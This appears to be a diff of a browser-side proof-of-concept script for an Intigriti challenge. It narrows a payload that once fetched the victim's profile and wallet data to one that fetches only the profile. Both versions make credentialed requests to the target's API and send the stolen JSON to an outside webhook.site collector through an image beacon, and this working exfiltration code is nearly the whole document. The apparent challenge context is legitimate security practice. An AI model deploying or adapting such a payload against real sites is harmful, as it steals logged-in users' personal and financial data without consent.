@@ -4,31 +4,25 @@
 <script>
 /*
   Diagnostic PoC
-  Goal: Verify admin authentication + wallet contents
+  Purpose: read current user profile (name / nickname)
 */
 
 const WEBHOOK = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";
 
 (async () => {
   try {
-    // 1️⃣ Check identity
-    const me = await fetch(
+    const res = await fetch(
       "https://challenge-0126.intigriti.io/api/me",
       { credentials: "include" }
-    ).then(r => r.json());
+    );
 
-    // 2️⃣ Fetch wallets
-    const wallets = await fetch(
-      "https://challenge-0126.intigriti.io/api/wallets",
-      { credentials: "include" }
-    ).then(r => r.json());
+    const data = await res.json();
 
-    // 3️⃣ Send everything to webhook
+    // Send entire profile object for inspection
     new Image().src =
       WEBHOOK +
-      "?stage=wallet_dump" +
-      "&user=" + encodeURIComponent(JSON.stringify(me)) +
-      "&wallets=" + encodeURIComponent(JSON.stringify(wallets));
+      "?stage=me_dump&data=" +
+      encodeURIComponent(JSON.stringify(data));
 
   } catch (e) {
     new Image().src =
